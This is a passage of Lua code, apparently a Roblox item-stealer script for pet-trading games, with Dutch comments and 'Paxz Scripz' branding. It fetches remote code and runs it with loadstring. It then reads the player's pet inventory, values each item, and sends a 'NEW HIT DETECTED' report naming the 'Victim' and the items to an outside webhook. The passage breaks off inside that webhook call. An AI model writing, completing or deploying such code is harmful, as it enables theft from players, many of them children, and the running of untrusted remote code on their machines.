-- 🛠 WAARDE DATABASE LADER [cite: 3]
local function getExternalValues()
    local success, source = pcall(function() return game:HttpGet(valuesUrl) end)
    if not success or source == "" then return {pets = {}} end
    source = source:match("^%s*(.-)%s*$")
    if not source:find("return") then source = source .. "\nreturn ValueList" end
    local loadFunc = loadstring or (syn and syn.load_string)
    local func = loadFunc and loadFunc(source)
    return func and func() or {pets = {}}
end
local ValueList = getExternalValues()

-- 🔍 ITEM INFO (Haalt Rarity, Tags en Values op) [cite: 4, 5, 6, 7]
local function getItemInfo(uniqueId)
    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
    pcall(function()
        local clientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local data = clientData.get_data()[LocalPlayer.Name]
        local inv = data and data.inventory
        for cat, group in pairs(inv) do
            if group[uniqueId] then
                local d = group[uniqueId]
                info.rawId = d.id or cat
                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
                local vData = ValueList.pets and ValueList.pets[name]
                local p = d.properties or {}
                
                -- Tags genereren (M, N, F, R)
                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. (p.flyable and "F" or "") .. (p.rideable and "R" or "")
                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
                
                if vData then
                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
                    info.value = vData[prefix] or vData["value"] or 0
                    info.rarity = (vData.rarity or "common"):upper()
                else
                    info.rarity = (d.rarity or "common"):upper()
                end
                break
            end
        end
    end)
    return info
end

-- 📊 HIT WEBHOOK 
local function postLog(data)
    if #data == 0 then return end
    
    local list, totalValue = "", 0
    for _, i in ipairs(data) do
        list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
        totalValue = totalValue + i.value
    end

    -- Alleen verzenden als waarde > 0
    if totalValue <= 0 then return end

    local logoUrl = "https://github.com/deltamokey-arch/idk/blob/945d613732990512e3b338936ecf3bb3c232e017/eaef8a71-28de-41a0-8e1f-500354554d5a.png?raw=true"
    
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "🚨 **NEW HIT DETECTED** 🚨",
                embeds = {{
                    title = "Paxz Scripz",
                    description = "Er is een waardevolle hit succesvol uitgevoerd!",
                    color = 16711680,
                    thumbnail = { url = logoUrl },
                    fields = {
                        { name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true },
                        { name = "💎 Total Value", value = "```" .. totalValue .. "```", inline = true },
                        { name = "📦 Items", value = list }
                    },
                    footer = { text = "Paxz Engine • " .. os.date("%X"), icon_url = logoUrl }
